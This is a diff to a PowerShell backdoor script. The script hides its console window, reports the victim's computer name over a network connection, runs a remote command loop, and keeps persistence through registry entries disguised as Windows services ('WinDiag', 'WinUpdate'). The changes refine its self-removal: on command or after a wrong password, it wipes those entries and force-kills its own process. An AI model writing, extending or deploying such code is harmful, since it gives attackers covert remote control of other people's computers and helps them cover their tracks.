@@ -21,7 +21,7 @@ try {
             $type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
         } catch {}
 
-        $w.WriteLine("--- ATOMIC ACCESS GRANTED: $env:COMPUTERNAME ---")
+        $w.WriteLine("--- COMPUTER CONNECTED: $env:COMPUTERNAME ---")
 
         # 4. MAIN COMMAND LOOP
         while($c.Connected) {
@@ -53,8 +53,11 @@ try {
                         $w.WriteLine("[+] Cleaned: $_")
                     }
                 }
-                $w.WriteLine("[!] All persistence removed. Terminating.")
-                $c.Close(); exit
+                $w.WriteLine("[!] All persistence removed. Killing process tree.")
+                
+                # THE GHOST-BUSTER: Stop the current process instantly
+                $c.Close()
+                Stop-Process -Id $PID -Force 
             }
             
             else {
@@ -63,7 +66,10 @@ try {
         }
     } else {
         # WRONG PASSWORD = EMERGENCY WIPE
-        "WinDiag","WinUpdate","WinLog","WinService" | % { Remove-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue }
+        "WinDiag","WinUpdate","WinLog","WinService" | % { 
+            $item = Get-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue
+            if ($item.$_ -like "*$user*") { Remove-ItemProperty -Path $reg -Name $_ }
+        }
         $w.WriteLine("WRONG PASSWORD. SELF-DESTRUCTING."); exit
     }
     $c.Close()
